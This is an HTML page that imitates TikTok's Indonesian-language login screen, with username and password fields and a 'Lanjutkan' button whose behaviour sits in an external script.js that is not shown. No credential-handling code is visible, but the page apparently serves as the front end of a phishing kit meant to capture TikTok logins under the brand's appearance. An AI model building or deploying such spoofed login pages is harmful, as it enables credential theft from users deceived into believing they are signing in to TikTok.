<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white rounded-lg shadow-lg p-6 w-80">
        <div class="flex justify-between items-center mb-4">
            <i class="fas fa-question-circle text-gray-400"></i>
            <i class="fas fa-times text-gray-400"></i>
        </div>
        <h1 class="text-2xl font-bold text-center mb-4">Masuk ke TikTok</h1>

        <!-- Input untuk username -->
        <input type="text" id="username" placeholder="Nomor telepon, alamat email, atau nama peng..." class="w-full p-3 mb-4 bg-gray-100 rounded-lg text-gray-400">

        <!-- Input untuk password -->
        <input type="password" id="password" placeholder="Password" class="w-full p-3 mb-4 bg-gray-100 rounded-lg text-gray-400">

        <!-- Tombol lanjutkan dengan event onclick -->
        <button id="lanjutkanBtn" class="w-full bg-red-500 text-white py-3 rounded-lg mb-4">Lanjutkan</button>

        <div class="flex items-center mb-4">
            <hr class="flex-grow border-gray-300">
            <span class="px-2 text-gray-400">atau</span>
            <hr class="flex-grow border-gray-300">
        </div>

        <!-- Sosial media buttons ... -->

        <p class="text-xs text-center text-gray-500 mb-4">
            Dengan menggunakan akun yang berlokasi di <span class="font-bold">Indonesia</span>, Anda menyetujui <span class="font-bold">Ketentuan Layanan</span> kami dan menyatakan bahwa Anda telah membaca <span class="font-bold">Kebijakan Privasi</span> kami.
        </p>
        <p class="text-center text-gray-500">
            Belum memiliki akun? <a href="#" class="text-red-500">Mendaftar</a>
        </p>
    </div>

    <!-- Menghubungkan file script.js -->
    <script src="script.js"></script>
</body>
</html>
